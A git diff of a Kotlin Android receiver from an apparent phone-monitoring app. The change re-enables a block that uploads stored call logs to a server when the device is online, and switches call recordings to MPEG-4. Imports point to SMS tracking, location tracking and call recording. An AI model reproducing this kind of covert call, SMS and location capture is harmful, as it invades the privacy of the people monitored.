@@ -8,18 +8,16 @@ import an.xuan.tong.historycontact.api.model.PowerAndInternet
 import an.xuan.tong.historycontact.api.model.SmsSendServer
 import an.xuan.tong.historycontact.call.CallRecord
 import an.xuan.tong.historycontact.location.LocationService
-import an.xuan.tong.historycontact.realm.InternetHistoryCaching
+import an.xuan.tong.historycontact.realm.RealmUtils
+import an.xuan.tong.historycontact.smsradar.SmsRadarService
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
-import android.os.Build
-import android.util.Log
-
-import an.xuan.tong.historycontact.realm.RealmUtils
-import an.xuan.tong.historycontact.smsradar.SmsRadarService
 import android.media.MediaRecorder
 import android.net.ConnectivityManager
+import android.os.Build
 import android.os.Environment
+import android.util.Log
 import com.facebook.accountkit.Account
 import com.facebook.accountkit.AccountKit
 import com.facebook.accountkit.AccountKitCallback
@@ -36,7 +34,7 @@ import java.util.*
 
 class SMSreceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
-       /* if (isOnline(context)) {
+        if (isOnline(context)) {
             //handler call
             val listCallLogFail = RealmUtils.getAllCallLog()
             listCallLogFail?.forEachIndexed { index, it ->
@@ -70,7 +68,7 @@ class SMSreceiver : BroadcastReceiver() {
             }
         } else {
             RealmUtils.saveInternetOnOff(false)
-        }*/
+        }
 
         if ("android.intent.action.BOOT_COMPLETED" == intent.action) {
             Log.e("antx", "onReceive sms BOOT_COMPLETED")
@@ -88,7 +86,7 @@ class SMSreceiver : BroadcastReceiver() {
                     .setRecordDirName("Historycontact")
                     .setRecordDirPath(Environment.getExternalStorageDirectory().path)
                     .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
-                    .setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
+                    .setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                     .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                     .setShowSeed(true)
                     .build()
